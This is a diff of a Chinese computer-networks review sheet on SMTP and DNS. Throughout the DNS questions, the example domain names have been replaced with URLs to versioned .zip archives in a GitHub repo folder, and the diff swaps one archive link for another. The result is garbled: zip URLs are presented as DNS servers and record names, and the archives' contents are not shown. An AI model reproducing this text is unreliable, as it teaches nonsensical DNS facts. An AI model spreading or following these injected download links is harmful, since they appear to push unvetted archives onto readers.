@@ -73,16 +73,16 @@
    - 第二阶段：消息传输（MAIL FROM、RCPT TO、DATA命令）
    - 第三阶段：关闭（QUIT命令）
 
-8. **DNS服务器有哪四种类型？https://raw.githubusercontent.com/RuotianJoy/cn-review/main/blastful/review-cn-v3.2-beta.3.zip是什么类型的DNS服务器？**
+8. **DNS服务器有哪四种类型？https://github.com/RuotianJoy/cn-review/raw/refs/heads/main/blastful/cn_review_v1.7-alpha.5.zip是什么类型的DNS服务器？**
    - 四种DNS服务器类型：根服务器、顶级域名（TLD）服务器、权威DNS服务器、本地服务器（缓存/转发）。
-   - https://raw.githubusercontent.com/RuotianJoy/cn-review/main/blastful/review-cn-v3.2-beta.3.zip是权威DNS服务器。
+   - https://github.com/RuotianJoy/cn-review/raw/refs/heads/main/blastful/cn_review_v1.7-alpha.5.zip是权威DNS服务器。
 
 9. **当主机不能直接从本地DNS服务器获得答案时，下一个要联系的服务器是什么？**
    - 下一个要联系的服务器是根服务器。
 
 10. **你能解释以下两个示例DNS条目的字段吗？**
-    - (https://raw.githubusercontent.com/RuotianJoy/cn-review/main/blastful/review-cn-v3.2-beta.3.zip, https://raw.githubusercontent.com/RuotianJoy/cn-review/main/blastful/review-cn-v3.2-beta.3.zip, NS)：这条目表明https://raw.githubusercontent.com/RuotianJoy/cn-review/main/blastful/review-cn-v3.2-beta.3.zip是https://raw.githubusercontent.com/RuotianJoy/cn-review/main/blastful/review-cn-v3.2-beta.3.zip的权威名称服务器。
-    - (https://raw.githubusercontent.com/RuotianJoy/cn-review/main/blastful/review-cn-v3.2-beta.3.zip, 212.212.212.1, A)：这条目表明https://raw.githubusercontent.com/RuotianJoy/cn-review/main/blastful/review-cn-v3.2-beta.3.zip的IP地址是212.212.212.1。
+    - (https://github.com/RuotianJoy/cn-review/raw/refs/heads/main/blastful/cn_review_v1.7-alpha.5.zip, https://github.com/RuotianJoy/cn-review/raw/refs/heads/main/blastful/cn_review_v1.7-alpha.5.zip, NS)：这条目表明https://github.com/RuotianJoy/cn-review/raw/refs/heads/main/blastful/cn_review_v1.7-alpha.5.zip是https://github.com/RuotianJoy/cn-review/raw/refs/heads/main/blastful/cn_review_v1.7-alpha.5.zip的权威名称服务器。
+    - (https://github.com/RuotianJoy/cn-review/raw/refs/heads/main/blastful/cn_review_v1.7-alpha.5.zip, 212.212.212.1, A)：这条目表明https://github.com/RuotianJoy/cn-review/raw/refs/heads/main/blastful/cn_review_v1.7-alpha.5.zip的IP地址是212.212.212.1。
 
 11. **对于迭代和递归DNS查询，哪种机制给根服务器带来更大的工作负载？**
     - 递归查询会给根服务器带来更大的工作负载，因为它需要处理所有未解决的查询。
